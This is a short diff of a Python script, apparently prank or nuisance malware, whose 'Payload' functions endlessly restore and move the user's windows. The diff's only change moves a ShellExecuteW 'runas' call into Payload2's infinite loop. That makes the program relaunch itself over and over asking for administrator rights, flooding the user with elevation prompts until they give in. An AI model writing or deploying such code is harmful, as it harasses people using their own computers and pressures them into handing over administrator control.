@@ -34,6 +34,7 @@ def Payload1():
 
 def Payload2():
   while True:
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
     window_titles = get_window_titles()
     for title in window_titles:
         restore_minimized_windows()
@@ -46,7 +47,6 @@ def move_window(hwnd, x, y):
   win32gui.SetWindowPos(hwnd, win32con.HWND_TOP, x, y, 0, 0, win32con.SWP_NOSIZE)
 
 if __name__ == "__main__":
-  ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
   timer_thread = threading.Thread(target=Payload1)
   timer_thread.start()
   timer_thread2 = threading.Thread(target=Payload2)
